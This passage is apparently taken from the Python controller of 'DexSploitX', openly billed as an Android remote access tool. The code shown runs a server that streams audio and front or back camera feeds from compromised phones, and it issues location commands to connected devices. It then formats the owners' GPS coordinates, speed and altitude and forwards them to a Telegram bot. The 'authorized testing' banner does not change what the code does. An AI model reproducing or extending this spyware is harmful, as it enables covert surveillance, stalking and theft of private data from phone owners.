                            dex_instance.audio_buffer.clear()
                        except (ConnectionAbortedError, BrokenPipeError):
                            pass
                    else:
                        # Send silence if no audio
                        self.wfile.write(b'\x00' * 320)
                
                elif self.path.startswith('/cmd/'):
                    cmd = self.path.split('/')[-1]
                    response_sent = False
                    
                    if cmd in ['front', 'back'] and dex_instance.current_device:
                        # Stop current stream
                        try:
                            dex_instance.send_command(dex_instance.current_device, "stopstream")
                            time.sleep(0.3)
                            dex_instance.send_command(dex_instance.current_device, f"camstream {cmd}")
                            response_sent = True
                        except:
                            pass
                    
                    elif cmd == 'stop' and dex_instance.current_device:
                        try:
                            dex_instance.send_command(dex_instance.current_device, "stopstream")
                            dex_instance.streaming = False
                            dex_instance.current_device = None
                            dex_instance.current_frame = None
                            response_sent = True
                        except:
                            pass
                    
                    elif cmd == 'stopaudio' and dex_instance.current_device:
                        try:
                            dex_instance.send_command(dex_instance.current_device, "stopaudio")
                            response_sent = True
                        except:
                            pass
                    
                    self.send_response(200 if response_sent else 500)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(b'OK' if response_sent else b'ERROR')
        
        try:
            HTTPServer(('0.0.0.0', 8080), StreamHandler).serve_forever()
        except Exception as e:
            print(f"[-] HTTP server error: {e}")
    
    # Unified Location methods
    def get_unified_location(self, session_name):
        """Get current location (on-demand)"""
        try:
            if self.send_command(session_name, "location"):
                print(f"[*] Fetching location from {session_name}...")
            else:
                print(f"[-] Failed to send location command")
        except Exception as e:
            print(f"[-] Location error: {e}")
    
    def format_and_display_location(self, payload, device_name):
        """Format and display location data nicely"""
        try:
            parts = payload.split('|')
            if len(parts) >= 8:
                location_type = parts[0].split(':', 1)[1] if ':' in parts[0] else 'UNKNOWN'
                lat = parts[1].split(':', 1)[1] if ':' in parts[1] else 'N/A'
                lon = parts[2].split(':', 1)[1] if ':' in parts[2] else 'N/A'
                accuracy = parts[3].split(':', 1)[1] if ':' in parts[3] else 'N/A'
                altitude = parts[4].split(':', 1)[1] if ':' in parts[4] else 'N/A'
                speed = parts[5].split(':', 1)[1] if ':' in parts[5] else 'N/A'
                provider = parts[6].split(':', 1)[1] if ':' in parts[6] else 'N/A'
                timestamp = parts[7].split(':', 1)[1] if ':' in parts[7] else 'N/A'
                google_url = parts[8].split(':', 1)[1] if len(parts) > 8 and ':' in parts[8] else f"https://maps.google.com/maps?q={lat},{lon}"
                
                # Choose icon based on location type
                if location_type == "LIVE":
                    icon = "🔴"
                    type_text = "LIVE"
                elif location_type == "CACHED":
                    icon = "📍"
                    type_text = "CACHED"
                elif location_type == "FRESH":
                    icon = "🎯"
                    type_text = "FRESH"
                else:
                    icon = "📍"
                    type_text = location_type
                
                # Format and display nicely
                print(f"\n┌─────────────────────────────────────────────────────────────┐")
                print(f"│ {icon} LOCATION - {type_text:<10} │ {timestamp:<25} │")
                print(f"├─────────────────────────────────────────────────────────────┤")
                print(f"│ 📍 Coordinates: {lat:<15} , {lon:<15}   │")
                print(f"│ 🎯 Accuracy:    {accuracy:<40}   │")
                print(f"│ ⛰️  Altitude:    {altitude:<40}   │")
                print(f"│ 🚀 Speed:       {speed:<40}   │")
                print(f"│ 📡 Provider:    {provider:<40}   │")
                print(f"│ 🌐 Google Maps: {google_url[:40]:<40}   │")
                if len(google_url) > 40:
                    print(f"│                 {google_url[40:]:<40}   │")
                print(f"└─────────────────────────────────────────────────────────────┘")
                print(f"DexSploitX ({device_name}) > ", end='', flush=True)
                
                # Send to Telegram
                if self.config.get('telegram_bot_token'):
                    tg_msg = f"{icon} Location - {type_text}\n"
                    tg_msg += f"📍 Coordinates: {lat}, {lon}\n"
                    tg_msg += f"🎯 Accuracy: {accuracy}\n"
                    tg_msg += f"⛰️ Altitude: {altitude}\n"
                    tg_msg += f"🚀 Speed: {speed}\n"
                    tg_msg += f"📡 Provider: {provider}\n"
                    tg_msg += f"🕒 Time: {timestamp}\n"
                    tg_msg += f"🌐 Google Maps: {google_url}\n"
                    tg_msg += f"📱 Device: {device_name}"
                    threading.Thread(target=self.send_to_telegram, args=(tg_msg,), daemon=True).start()
            else:
                # Fallback for malformed data
                print(f"\n📍 [LOCATION] {payload}")
                print(f"DexSploitX ({device_name}) > ", end='', flush=True)
        except Exception as e:
            print(f"\n📍 [LOCATION] {payload}")
            print(f"DexSploitX ({device_name}) > ", end='', flush=True)

if __name__ == "__main__":
    # Banner
    banner = """
\033[96m╔═══════════════════════════════════════════════════════════╗
║        \033[91m██████╗ ███████╗██╗  ██╗███████╗██████╗ \033[96m        ║
║        \033[91m██╔══██╗██╔════╝╚██╗██╔╝██╔════╝██╔══██╗\033[96m        ║
║        \033[91m██║  ██║█████╗   ╚███╔╝ ███████╗██████╔╝\033[96m        ║
║        \033[91m██║  ██║██╔══╝   ██╔██╗ ╚════██║██╔═══╝ \033[96m        ║
║        \033[91m██████╔╝███████╗██╔╝ ██╗███████║██║     \033[96m        ║
║        \033[91m╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝     \033[96m        ║
║                                                           ║
║          \033[93mAndroid Remote Access Tool v2.0\033[96m              ║
║          \033[92mSupports Android 5.0 - 16 (API 21-36)\033[96m       ║
║                                                           ║
║          \033[1mDeveloped by: \033[93mNIGHTKING\033[96m                    ║
║          \033[1mGitHub: \033[93mhttps://github.com/offsecnight\033[96m    ║
╚═══════════════════════════════════════════════════════════╝\033[0m

\033[93m[!] FOR AUTHORIZED SECURITY TESTING ONLY\033[0m
"""
    print(banner)
    
    parser = argparse.ArgumentParser(description="DexSploitX - Android Remote Access Tool")
    parser.add_argument("-i", "--ip", required=True, help="IP to bind")
    parser.add_argument("-p", "--port", type=int, required=True, help="Port to listen")
    args = parser.parse_args()
    
    dex = DexSploitX(args.ip, args.port)
    dex.start_listener()
